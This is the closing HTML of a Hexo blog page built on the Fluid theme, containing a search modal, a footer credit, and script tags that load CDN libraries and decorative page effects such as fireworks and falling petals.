        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>





  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>














  
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/qipao.js"></script>
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/yinghua.js"></script>
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/boom.js"></script>



<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



<!--//背景线条      {% if theme.canvas_nest %}-->
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
{% endif %}

<!-- fireworks-->
<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
<script type="text/javascript" src="/js/fireworks.js"></script>

</body>
</html>
